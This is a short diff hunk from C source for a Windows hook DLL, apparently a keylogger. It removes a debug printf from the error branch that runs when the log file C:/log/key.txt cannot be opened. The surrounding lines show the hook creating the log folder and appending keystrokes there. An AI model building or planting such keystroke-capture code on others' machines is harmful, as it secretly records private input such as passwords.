@@ -37,7 +37,6 @@ __declspec(dllexport) LRESULT WINAPI MyHook(int code, WPARAM wParam, LPARAM lPar
                 CreateDirectory((LPTSTR)"C:/log", NULL);
             fp = fopen("C:/log/key.txt", "a+");
             if (fp == NULL) {
-                printf("create file fail\n");
                 MessageBox(NULL, (LPTSTR)"create file fail", (LPTSTR)"Error", MB_OK);
             }
             
